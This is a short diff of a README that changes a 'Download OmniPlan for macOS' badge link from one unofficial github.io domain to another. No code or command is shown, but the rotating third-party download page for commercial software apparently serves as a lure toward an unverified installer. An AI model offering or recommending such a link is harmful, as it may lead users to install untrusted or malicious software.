@@ -5,7 +5,7 @@
 ---
 
 ## ✅ Download OmniPlan for macOS  
-[![Download OmniPlan](https://img.shields.io/badge/Download-OmniPlan-blueviolet)](https://omniplan-mac-download.github.io/.github)
+[![Download OmniPlan](https://img.shields.io/badge/Download-OmniPlan-blueviolet)](https://task-office-mac-download.github.io/.github)
 
 ---
 
